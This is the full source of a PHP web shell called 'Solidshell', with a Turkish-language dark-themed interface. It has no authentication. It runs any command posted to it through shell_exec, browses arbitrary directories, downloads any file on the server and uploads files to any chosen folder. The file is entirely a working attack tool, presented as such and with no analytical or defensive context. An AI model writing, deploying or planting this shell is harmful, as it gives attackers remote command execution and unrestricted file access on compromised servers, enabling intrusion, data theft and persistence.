<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
}

if (isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    $files = scandir($dir);
} else {
    $dir = '.';
    $files = scandir($dir);
}

if (isset($_FILES['file_to_upload'])) {
    $upload_dir = $dir;
    $target_file = $upload_dir . '/' . basename($_FILES['file_to_upload']['name']);
    if (move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $target_file)) {
        $upload_status = "Dosya başarıyla yüklendi.";
    } else {
        $upload_status = "Dosya yükleme başarısız.";
    }
}

if (isset($_GET['download'])) {
    $file_to_download = $_GET['download'];
    if (file_exists($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file_to_download));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_to_download));
        flush();
        readfile($file_to_download);
        exit;
    } else {
        echo 'Dosya bulunamadı.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solidshell</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1b1b1b; color: #e0e0e0; margin: 0; padding: 0; }
        h2 { background-color: #212121; color: #f0f0f0; padding: 15px; margin: 0; text-align: center; }
        .container { padding: 20px; max-width: 900px; margin: auto; }
        input[type="text"], input[type="file"] { width: 100%; padding: 12px; margin-top: 10px; background: #333; color: #fff; border: 1px solid #555; border-radius: 5px; box-sizing: border-box; }
        input[type="submit"] { background: #4caf50; color: white; padding: 10px 20px; border: none; border-radius: 5px; margin-top: 10px; cursor: pointer; }
        input[type="submit"]:hover { background: #45a049; }
        a { color: #4caf50; text-decoration: none; }
        pre { background: #212121; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
        ul { list-style-type: none; padding-left: 0; }
        ul li { margin: 8px 0; }
        ul li a { background-color: #333; padding: 10px; display: inline-block; border-radius: 5px; }
        ul li a:hover { background-color: #555; }
        .upload-section, .command-section, .file-list-section { margin-top: 20px; }
        .status { color: #4caf50; }
    </style>
</head>
<body>
    <h2>Solidshell PHP Web Shell</h2>
    <div class="container">
        <div class="command-section">
            <form method="post">
                <input type="text" name="cmd" placeholder="Komut girin">
                <input type="submit" value="Çalıştır">
            </form>
            <?php if (isset($output)): ?>
            <div class="output">
                <h3>Çıktı:</h3>
                <pre><?php echo htmlentities($output); ?></pre>
            </div>
            <?php endif; ?>
        </div>

        <div class="file-list-section">
            <h3>Dosya Tarayıcı (Dizin: <?php echo htmlentities($dir); ?>)</h3>
            <ul>
                <?php foreach ($files as $file): ?>
                    <li>
                        <?php if (is_dir($dir . '/' . $file)): ?>
                            <a href="?dir=<?php echo urlencode($dir . '/' . $file); ?>"><?php echo htmlentities($file); ?></a>
                        <?php else: ?>
                            <a href="?download=<?php echo urlencode($dir . '/' . $file); ?>"><?php echo htmlentities($file); ?></a>
                        <?php endif; ?>
                    </li>
                <?php endforeach; ?>
            </ul>
        </div>

        <div class="upload-section">
            <h3>Dosya Yükle</h3>
            <form enctype="multipart/form-data" method="post">
                <input type="file" name="file_to_upload">
                <input type="submit" value="Yükle">
            </form>
            <?php if (isset($upload_status)) echo "<p class='status'>$upload_status</p>"; ?>
        </div>
    </div>
</body>
</html>
